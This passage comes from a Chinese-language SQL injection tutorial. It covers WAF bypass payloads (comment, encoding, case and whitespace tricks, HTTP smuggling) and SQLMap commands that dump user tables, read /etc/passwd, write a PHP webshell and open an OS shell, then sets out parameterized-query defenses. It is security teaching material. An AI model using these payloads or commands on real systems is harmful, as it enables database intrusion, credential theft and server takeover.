#e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">dbms_pipe.receive</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#333;"><section><span leaf="">pg_sleep(N)</span></section></td></tr><tr><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;background:#fafafa;"><section><span leaf="">堆叠注入</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#f57c00;"><section><span leaf="">PDO 支持</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#00875a;"><section><span leaf="">原生支持</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#e53935;"><section><span leaf="">不支持</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#00875a;"><section><span leaf="">原生支持</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:8px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#555;"><section><span leaf="">写文件</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#f57c00;"><section><span leaf="">INTO OUTFILE</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#f57c00;"><section><span leaf="">xp_cmdshell</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#e53935;"><section><span leaf="">受限</span></section></td><td style="padding:8px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;text-align:center;color:#f57c00;"><section><span leaf="">COPY TO</span></section></td></tr></tbody></table>  
10  
WAF 绕过技巧汇总  
  
WAF（Web 应用防火墙）基于规则匹配过滤恶意请求，但规则往往无法覆盖所有变种。以下是实战中常用的绕过维度：  
  
①  注释符与内联注释绕过  
  
# MySQL 内联注释（被当作注释但数据库执行）  
  
UNION/**/SELECTUN/**/ION SEL/**/ECTUNION/*!32302 SELECT*/  
--   
  
版本号条件注释  
# 编码绕过  
  
%23 = #       
  
%2d%2d = --       
  
%20 = (空格)  
  
# 双重URL编码  
  
%2527 → %27 → '  
  
②  大小写混淆 & 关键词拆分  
  
UnIoN SeLeCt  
# 大小写混淆  
  
UNunionION SEselectLECT  
# 双写绕过（过滤后拼起来还是关键词）  
  
UNION%0aSELECT  
# 换行符替代空格  
  
UNION%09SELECT  
# TAB 替代空格  
  
UNION%0d%0aSELECT  
# CRLF 替代空格  
  
③  空格替代方案  
  
# 以下字符均可在 MySQL 中替代空格  
  
/*注释*/      
  
%09(TAB)      
  
%0a(换行)      
  
%0c(换页)%0d(回车)     
  
%0b(垂直TAB)     
  
()(括号)  
  
# 示例  
  
UNION(SELECT(1),(2),(3))SELECT(1)FROM(users)WHERE(1)=1  
  
④  等价函数 & 表达式替换  
  
# 等号替代  
= → LIKE / REGEXP / IN / BETWEEN  
  
# substr 替代  
substr(str,1,1) → mid(str,1,1) → left(str,1)  
  
# ASCII 替代  
ascii() → ord() → hex()  
  
# if 替代  
if(cond,a,b) → case when cond then a else b end  
  
# 字符串构造（绕过引号过滤）  
'admin' → 0x61646d696e → char(97,100,109,105,110)  
  
⑤  HTTP 层面绕过  
  
# 分块传输（Chunked Transfer）绕过 WAF  
  
Transfer-Encoding: chunked→ 请求体被分块，WAF 无法拼接完整 Payload 检测  
  
# 参数污染 (HPP)  
  
?id=1&id=UNION SELECT 1,2,3→ 某些 WAF 只检测第一个参数  
  
# 修改 Content-Type 绕过  
  
Content-Type: application/json    → {"id":"1' UNION SELECT ..."}Content-Type: multipart/form-data → 分片传输注入  
  
11  
SQLMap   
  
SQLMap 是最强大的自动化 SQL 注入工具，支持全类型注入、多数据库、自动化 Dump 等功能。以下为渗透测试中最常用的命令组合：  
  
terminal — SQLMap 常用命令  
  
# ──────────────── 基础检测 ────────────────  
  
sqlmap  
 -u  
"http://target.com/page?id=1"  
sqlmap  
 -u  
"..."  
 --dbs  
# 枚举所有数据库  
  
sqlmap  
 -u  
"..."  
 -D security --tables  
  
# 枚举指定库的表  
sqlmap  
 -u  
"..."  
 -D security -T users --columns  
  
# 枚举列  
sqlmap  
 -u  
"..."  
 -D security -T users -C username,password --dump  
# Dump  
  
# ──────────────── POST 注入 ────────────────  
  
sqlmap  
 -u  
"http://target.com/login"  
 \  --data  
"username=admin&password=123"  
 \  -p username --dbs  
  
# ──────────────── Cookie 注入 ────────────────  
  
sqlmap  
 -u  
"http://target.com/"  
 \  --cookie  
"PHPSESSID=abc; userid=1"  
 \  -p userid --dbs  
  
# ──────────────── 使用 Burp 抓包文件 ────────────────  
  
sqlmap  
 -r request.txt -p id --dbs  
  
# ──────────────── 指定注入技术 ────────────────  
  
sqlmap  
 -u  
"..."  
 --technique=  
BEUSTQ  
# B=布尔盲注 E=报错注入 U=联合查询 S=堆叠 T=时间盲注 Q=内联查询  
  
# ──────────────── WAF 绕过 ────────────────  
  
sqlmap  
 -u  
"..."  
 --tamper=space2comment,randomcase,between  
sqlmap  
 -u  
"..."  
 --random-agent --delay=2 --level=5 --risk=3  
  
# ──────────────── 高权限利用 ────────────────  
  
sqlmap  
 -u  
"..."  
 --file-read=  
"/etc/passwd"  
sqlmap  
 -u  
"..."  
 --file-write=  
"shell.php"  
 --file-dest=  
"/var/www/html/s.php"  
sqlmap  
 -u  
"..."  
 --os-shell  
# 获取交互式系统命令行  
  
常用 Tamper 脚本速查：  
<table><thead><tr style="background:#f5f5f5;"><th style="font-family:monospace;font-size:10px;letter-spacing:1px;color:#666;text-transform:uppercase;padding:8px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">Tamper</span></section></th><th style="font-family:monospace;font-size:10px;letter-spacing:1px;color:#666;text-transform:uppercase;padding:8px 12px;border:1px solid #e0e0e0;text-align:left;"><section><span leaf="">作用</span></section></th></tr></thead><tbody><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;background:#fafafa;"><section><span leaf="">space2comment</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">空格替换为 /**/</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;"><section><span leaf="">randomcase</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">关键词随机大小写混淆</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;background:#fafafa;"><section><span leaf="">between</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">用 BETWEEN 替代 &gt; 和 =</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;"><section><span leaf="">charencode</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">URL 编码所有字符</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;background:#fafafa;"><section><span leaf="">equaltolike</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">= 替换为 LIKE</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;"><section><span leaf="">unionalltounion</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">UNION ALL SELECT 替换为 UNION SELECT</span></section></td></tr><tr><td style="padding:7px 12px;border:1px solid #e0e0e0;font-family:monospace;font-size:11px;color:#e53935;background:#fafafa;"><section><span leaf="">modsecurityversioned</span></section></td><td style="padding:7px 12px;border:1px solid #e0e0e0;color:#555;font-size:12.5px;"><section><span leaf="">针对 ModSecurity 的版本号注释绕过</span></section></td></tr></tbody></table>  
12  
完整防御方案  
  
✓  
核心原则  
  
**根本防御 = 预编译（参数化查询）+ 最小权限 + 输入验证**  
。WAF 和错误信息屏蔽是辅助手段，不能替代根本修复。  
  
//  
 第一道防线：预编译参数化查询（最重要）  
  
CODE  
各语言预编译写法  
  
// ── PHP (PDO) ──  
  
$stmt  
 =  
$pdo  
->  
prepare  
(  
"SELECT * FROM users WHERE id = :id"  
);  
  
$stmt  
->  
bindParam  
(  
':id'  
,  
$id  
, PDO::PARAM_INT);  
  
$stmt  
->  
execute  
();  
  
// ── Java (PreparedStatement) ──  
  
PreparedStatement  
 stmt = conn.  
prepareStatement  
(  
"SELECT * FROM users WHERE id = ?"  
);  
  
stmt.  
setInt  
(  
1  
, userId);  
ResultSet  
 rs = stmt.  
executeQuery  
();  
  
// ── Python (sqlite3 / mysql-connector) ──  
  
cursor.  
execute  
(  
"SELECT * FROM users WHERE id = %s"  
,    (user_id,)  
# 元组形式传参，驱动负责转义  
)  
// ── Node.js (mysql2) ──  
connection.  
execute  
(  
'SELECT * FROM users WHERE id = ?'  
,    [userId],    (err, results) => { ... });  
  
//  
 完整防御体系清单  
<table><tbody><tr style="background:#f0fdf6;"><td style="padding: 10px 12px;border: 1px solid rgb(224, 224, 224);font-weight: bold;color: rgb(0, 135, 90);text-align: center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">预编译参数化查询</span></strong><section><span leaf="">——彻底解决拼接问题，是根本防御措施，无论如何必须执行</span></section></td></tr><tr><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">最小权限原则</span></strong><section><span leaf="">——应用程序数据库账号只授予必要权限（SELECT/INSERT），禁止 FILE、SUPER 等高危权限</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">输入验证与白名单</span></strong><section><span leaf="">——对类型、长度、格式严格校验；ORDER BY 列名等不能参数化的场景使用白名单映射</span></section></td></tr><tr><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#f57c00;text-align:center;"><section><span leaf="">⚠</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">ORM 框架</span></strong><section><span leaf="">——使用 MyBatis、Hibernate、Django ORM 等，但警惕原生 SQL 拼接（</span><code style="font-family:monospace;background:#f5f5f5;font-size:12px;"><span leaf="">${}` 而非 `#{}</span></code><span leaf="">）</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">屏蔽错误信息</span></strong><section><span leaf="">——生产环境禁止显示详细数据库错误，统一返回自定义错误页（防止报错注入）</span></section></td></tr><tr><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">WAF 部署</span></strong><section><span leaf="">——作为辅助纵深防御，过滤明显的注入 Payload，同时建立告警与监控</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">定期代码审计</span></strong><section><span leaf="">——使用 SAST 工具（Checkmarx、SonarQube）扫描拼接 SQL，结合人工审计</span></section></td></tr><tr><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#00875a;text-align:center;"><section><span leaf="">✓</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">数据库加密</span></strong><section><span leaf="">——敏感字段（密码）使用强哈希（bcrypt/Argon2），即使被 Dump 也无法直接使用</span></section></td></tr><tr style="background:#fafafa;"><td style="padding:10px 12px;border:1px solid #e0e0e0;font-weight:bold;color:#1565c0;text-align:center;"><section><span leaf="">i</span></section></td><td style="padding:10px 12px;border:1px solid #e0e0e0;"><strong style="color:#111;"><span leaf="">SQL 注入检测日志</span></strong><section><span leaf="">——在数据库或应用层记录异常查询，接入 SIEM 实现实时告警与溯源</span></section></td></tr></tbody></table>  
  
// 正文结束 · END //  
  
本文所有技术内容仅供网络安全学习与研究，均在授权或靶场环境下验证。  
  
严禁将本文所述技术用于未经授权的攻击行为，违者自负法律责任。  
  
© 2026  转载请注明出处  
  
